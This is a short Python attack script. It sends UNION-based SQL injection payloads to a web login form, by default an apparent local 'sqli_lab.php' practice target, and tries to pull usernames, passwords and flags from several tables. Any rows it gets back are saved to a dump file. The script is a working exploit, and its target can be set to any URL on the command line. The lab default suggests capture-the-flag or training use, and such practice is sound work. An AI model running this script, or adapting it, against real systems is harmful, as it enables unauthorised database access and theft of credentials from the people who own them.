import requests
import sys
import time

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/sqli_lab.php"
payload_template = "' UNION SELECT null,{} FROM {} -- "
tables = ['users', 'flags', 'passwords']
columns = ['username,password', 'flag', 'id,cred']
for table, col in zip(tables, columns):
    payload = payload_template.format(col, table)
    r = requests.get(target, params={'user': payload, 'pass': 'x'})
    if 'FLAG' in r.text or 'admin' in r.text:
        print(f"\033[92m[+] DATA from {table}: {r.text[:200]}\033[0m")
        with open('../logs/sqli_dump.txt', 'a') as f:
            f.write(f"{table}: {r.text}\n")
    else:
        print(f"\033[91m[-] No data from {table}\033[0m")
    time.sleep(0.5)